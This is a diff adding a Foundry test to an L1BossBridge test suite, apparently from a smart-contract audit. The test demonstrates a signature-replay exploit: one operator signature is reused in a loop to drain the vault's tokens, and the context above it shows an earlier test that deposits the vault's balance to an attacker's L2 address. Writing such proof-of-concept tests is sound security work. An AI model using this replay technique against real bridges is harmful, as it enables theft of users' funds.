@@ -300,4 +300,57 @@ contract L1BossBridgeTest is Test {
         emit Deposit(address(vault), attacker, vaultBalance);
         tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
     }
+
+    function testSignatureReply() public {
+        // assume the vault already holds some tokens
+
+        uint256 vaultInitialBalance = 1000e18;
+        uint256 attackerInitialBalance = 100e18;
+
+        address attacker = makeAddr("attacker");
+
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        deal(address(token), address(attacker), attackerInitialBalance);
+
+        // An attacker depostis tokens to L2
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(
+            attacker,
+            attacker,
+            attackerInitialBalance
+        );
+
+        // Signer/Operator is going to sign the withdraw
+        bytes memory message = abi.encode(
+            address(token),
+            0,
+            abi.encodeCall(
+                IERC20.transferFrom,
+                (address(vault), attacker, attackerInitialBalance)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            operator.key,
+            MessageHashUtils.toEthSignedMessageHash(keccak256(message))
+        );
+        // Attack
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(
+                attacker,
+                attackerInitialBalance,
+                v,
+                r,
+                s
+            );
+        }
+
+        assertEq(
+            token.balanceOf(address(attacker)),
+            attackerInitialBalance + vaultInitialBalance
+        );
+        assertEq(token.balanceOf(address(vault)), 0);
+    }
 }
